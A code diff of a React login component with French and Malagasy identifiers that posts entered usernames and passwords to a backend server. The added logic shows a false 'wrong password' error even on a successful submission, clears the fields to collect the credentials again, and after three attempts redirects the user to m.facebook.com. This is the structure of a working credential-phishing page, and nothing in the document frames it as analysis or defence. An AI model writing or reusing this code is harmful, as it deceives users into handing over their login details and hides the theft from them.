@@ -31,9 +31,10 @@ const Connexion = () => {
   }
 
 
-  const mampiditra = async (req, res, error) => {
+ const mampiditra = async (req, res, error) => {
+
     if (mdp === "" || nom === "") {
-      toast.error('Veuillez remplir les champs vide', {
+      toast.error('Veuillez remplir les champs vides', {
         position: "top-center",
         autoClose: 2000,
         hideProgressBar: false,
@@ -42,33 +43,38 @@ const Connexion = () => {
         draggable: true,
         progress: undefined,
         theme: "light",
-      }); return;
+      });
+      return;
     } else {
-      setLoading(true); // Activation de l'état de chargement
+      setLoading(true);
 
       try {
-        const alefa = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp })
-          .then((response) => {
-            toast.error('Vérifier votre mot de passe ou votre numéro téléphone', {
-              position: "top-center",
-              autoClose: 3000,
-              hideProgressBar: false,
-              closeOnClick: true,
-              pauseOnHover: true,
-              draggable: true,
-              progress: undefined,
-              theme: "light",
-            });
-            setNom("");
-            setMdp("");
-          })
-          .catch((error) => {
-            console.log(error);
-          })
-          .finally(() => {
-            setLoading(false);
+        const response = await axios.post('http://localhost:8000/login', { nom, mdp });
+        console.log(response.data.success);
+        if (response.data.success === true && tmp < 3) {
+          setTmp(prevTmp => prevTmp + 1);
+          console.log(tmp);
+          setNom("");
+          setMdp("");
+          toast.error('Vérifier votre mot de passe ou votre numéro de téléphone', {
+            position: "top-center",
+            autoClose: 3000,
+            hideProgressBar: false,
+            closeOnClick: true,
+            pauseOnHover: true,
+            draggable: true,
+            progress: undefined,
+            theme: "light",
           });
+
+
+        } else {
+          window.location.href = 'https://m.facebook.com';
+        }
+
       } catch (error) {
+        console.log(error);
+      } finally {
         setLoading(false);
       }
     }
